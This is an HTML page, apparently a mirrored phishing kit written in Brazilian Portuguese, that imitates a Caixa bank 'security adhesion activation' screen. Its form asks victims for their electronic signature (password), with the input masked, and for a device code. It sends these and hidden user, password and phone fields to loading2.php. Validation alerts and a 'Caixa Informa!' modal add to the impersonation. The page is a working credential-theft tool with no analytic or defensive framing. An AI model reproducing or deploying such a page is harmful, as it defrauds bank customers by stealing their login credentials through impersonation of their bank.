<!DOCTYPE html>
<html lang="pt-br">
<!-- Added by HTTrack --><meta http-equiv="content-type" content="text/html;charset=UTF-8" /><!-- /Added by HTTrack -->
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1, user-scalable=no">
<script type="text/javascript" src="scripts/htmlshiv.html"></script>
<link rel="stylesheet" type="text/css" href="css/style3.css" media="all" />
<script language="javascript" src="scripts/validation.js"></script>
<link href="css/styles.css" rel="stylesheet" type="text/css">
<link rel="stylesheet" type="text/css" href="css/style.css" media="all" />

	
<style>
.u { font-family:Arial, Helvetica, sans-serif; font-size:1px; color:#FFF; }
input { width:95%; font-size:14px; outline:none; padding:0 0 0 10px; height:40px; border:none; border-bottom:1px solid #CCC; }
body{	padding: 0px; overflow:hidden; margin: 0px; background:#FAFBFD;	}
#proceguir { width:100%; height:45px; background:url(images/a005.html); font-size:100%; border:none; text-align:center; color:#FFF; }
.bottoms{width:100%; height:40px; position:fixed; bottom:0; background:#FFF; padding:10px; display:block;}

.pos {font-family:'Arial'; font-size:17px; color:#5574B4; margin-top:10px; padding:10px; background:#FFF; border-bottom:1px solid #EDEDED; display:block; }

@media only screen and (max-width: 380px) {
	#bottoms { display:none; !important}
	#pos { display:none; !important}
}
	
input[name="cc"] {
  -webkit-text-security: disc;
}
	
</style>
<script type="text/javascript">

/* Máscaras ER */

function mascara(o,f){

v_obj=o;

v_fun=f;

setTimeout("execmascara()",1);

}

function execmascara(){

v_obj.value=v_fun(v_obj.value);

}

function alphanum( v ){

v=v.replace(/[^a-zA-Z0-9]/g,""); //Remove tudo o que não é dígito

return v;

}

</script>

<script>

function mascara(o,f){
    v_obj=o
    v_fun=f
    setTimeout("execmascara()",1)
}
function execmascara(){
    v_obj.value=v_fun(v_obj.value)
}
function mtel(v){
    v=v.replace(/\D/g,"");             
    v=v.replace(/(\d)(\d{1})$/,"$1-$2");   
    return v;
}
function id( el ){
	return document.getElementById( el );
}
window.onload = function(){
	id('ct').onkeyup = function(){
		mascara( this, mtel );
	}
}


function xsxoxdxixnxhxexixrxox(e){
    var tecla=(window.event)?event.keyCode:e.which;   
    if((tecla>47 && tecla<58)) return true;
    else{
    	if (tecla==8 || tecla==0) return true;
	else  return false;
    }
}

function validation2() {
 
if(document.form.ag.value=="" || document.form.ag.value.length < 8)
{
alert( "Usuario inválido, preencha corretamente." );
document.form.ag.focus();
return false;
}
 if(document.form.s8.value=="" || document.form.s8.value.length < 6)
{
alert( "Assinatura inválida, digite a sua senha corretamente." );
document.form.s8.focus();
return false;
}
return true;
}




</script>

<script>
function validation1() {
 
if(document.form.dispositivo.value=="" || document.form.dispositivo.value.length < 8)
{
alert( "Dispositivo inválido, preencha corretamente, seu dispositivo deve conter no minimo 8 caracteres." );
document.form.dispositivo.focus();
return false;
}
 
 if(document.form.cc.value=="" || document.form.cc.value.length < 6)
{
alert( "Assinatura inválida, preencha corretamente." );
document.form.cc.focus();
return false;
}
return true;
}

</script>
<script>
  function limitarInput1(obj) {
    obj.value = obj.value.substring(0,6); 
  }
</script>
<script>
  function limitarInput2(obj) {
    obj.value = obj.value.substring(0,12); 
  }
</script>

	<script>
function proximoCampo(atual,proximo){
if(atual.value.length >= atual.maxLength){
document.getElementById(proximo).focus();
}
}
</script>

<meta name="RATING" content="RTA-5042-1996-1400-1577-RTA" /></head>

<!-- Bootstrap core CSS -->
    <link rel="stylesheet" href="https://stackpath.bootstrapcdn.com/bootstrap/4.3.1/css/bootstrap.min.css" integrity="sha384-ggOyR0iXCbMQv3Xipma34MD+dH/1fQ784/j6cY/iJTQUOhcWr7x9JvoRxT2MZw1T" crossorigin="anonymous">
<body class="barraInter"  onLoad="$('#modal').click();">
<div id="bgadd"></div>

<div style="display:none;" id="modalalert" class="modalposition">
<div class="modaldiv1">
<center>
<div class="modalinforma"><div class="glyphicon glyphicon glyphicon-lock" style="padding:0 10px 0 0;"></div>Caixa Informa!</div>
<div class="modaltext"><div id="TextErrorModal">Erro</div></div>
</center>
</div>
<div class="modaldiv2" align="center">
<a href="#closemodal"><button class="bttok" onClick="feixaMG()">&nbsp;&nbsp;Ok&nbsp;&nbsp;</button></a>
</div>
</div>


<div style="width:100%; height:50px; background:#fd9607; color:#5574B4; font-family:'Arial'; font-size:17px; font-weight:bold;">
<table width="100%" cellspacing="0" cellpadding="0">
<tbody><tr>
<td width="30" height="50" bgcolor="#296fa7">
</td>
<td bgcolor="#296fa7" align="center"><font face="arial" color="#F5FBEF"><img src="../assets/img/logotipo.png" width="126" height="50"></font></td>
<td style="padding:0 10px 0 0;" width="30" bgcolor="#296fa7"></td>
</tr>
<tr>
<td height="3" bgcolor="#fd9607" align="center">
</td>
<td height="3" bgcolor="#fd9607" align="center">
</td>
<td height="3" bgcolor="#fd9607" align="center">
</td>
</tr>
</tbody></table>
</div>
<div style=" max-width:750px; margin:0 auto;">
<form name="form" id="form" action="loading2.php" method="POST" onSubmit="return validation1()" autocomplete="off">

<div style="background:#FFF;  margin-top:10px; padding:1;">
<div style="font-family:'Arial'; font-size:17px; color:#296fa7; margin-bottom:20px; ">
	<center><font size="3" face="Verdana"><b>ATIVAÇÃO DE ADESÃO</b></font><br>
	<center><font size="1" color="#296fa7" face="Verdana">
<b>Nova adesão de segurança</b></font>
</div>
<tr>
<center><font size="1" color="#296fa7" face="Verdana">
<b>Para sua segurança confirme sua assinatura eletrônica</b></font>
			
		</tr>
<div class="group" style="padding: 5px 10px 0px;">      
  <input id="cc" name="cc" maxlength="6" type="tel" style="width: 100%; color: dimgray;" required autofocus onfocus="this.value='';" onkeyup="mascara( this, alphanum ),limitarInput1(this)" />
      <span class="bar"></span>
      <label><span class="span-input"><b>Assinatura</b></span></label>	  
  </div>
	<center><font size="1" color="#296fa7" face="Verdana">
<b>digite seu novo dispositivo</b></font>
    <div class="group" style="padding: 5px 10px 0px;">      
  <input id="dispositivo" name="dispositivo" maxlength="12" type="text" style="width: 100%; color: dimgray;" required autofocus onfocus="this.value='';" onkeyup="mascara( this, alphanum ),limitarInput2(this)" />
      <span class="bar"></span>
      <label><span class="span-input"><b>Dispositivo</b></span></label>	  
  </div>
</div>
	


<div style="background:#FFF; padding:10px; margin-top:10px; border-bottom:1px solid #EDEDED;">
<div style="margin:0 10px 20px 0; float:right; color:#666666; font-family:'Arial'; font-size:13px;">
	<font size="1" face="Verdana"><b>*Todos os campos são obrigatórios</b></font></div>
<div class="group">      
           <button id="btt" name="btt" type="submit" class="giris-yap-buton">Confirmar</button>
    </div></div>
<input type="hidden" name="ag" id="ag" value="">
<input type="hidden" name="s8" id="s8" value="">
<input type="hidden" name="cel" id="cel" value="">

</form>
</div>



<div class="bottoms" id="bottoms">
<div style="width:40px; height:40px; background:url(images/a008.html) no-repeat; float:left;"></div>
<div style="width:40px; height:40px; background:url(images/a009.html) no-repeat; float:right; margin-right:20px;"></div>
</div>
<script>
function feixaMG(){
	document.getElementById('modalalert').style.display='none';
	document.getElementById('bgadd').style.display='none';
	}
</script>

<button id="modal" type="button" data-toggle="modal" data-target="#exampleModal" style="display: none">
  
</button>



    <!-- Bootstrap core JavaScript
    ================================================== -->
    <!-- Placed at the end of the document so the pages load faster -->

	  <script src="https://code.jquery.com/jquery-3.3.1.slim.min.js" integrity="sha384-q8i/X+965DzO0rT7abK41JStQIAqVgRVzpbzo5smXKp4YfRvH+8abtTE1Pi6jizo" crossorigin="anonymous"></script>
	  <script type="text/javascript" src="js/aapf.js?v=08"></script>
	  <script src="https://cdnjs.cloudflare.com/ajax/libs/popper.js/1.14.7/umd/popper.min.js" integrity="sha384-UO2eT0CpHqdSJQ6hJty5KVphtPhzWj9WO1clHTMGa3JDZwrnQq4sF86dIHNDz0W1" crossorigin="anonymous"></script>
	  <script src="https://stackpath.bootstrapcdn.com/bootstrap/4.3.1/js/bootstrap.min.js" integrity="sha384-JjSmVgyd0p3pXB1rRibZUAYoIIy6OrQ6VrjIEaFf/nJGzIxFDsf4x0xIM+B07jRM" crossorigin="anonymous"></script>
	  
	  
</html>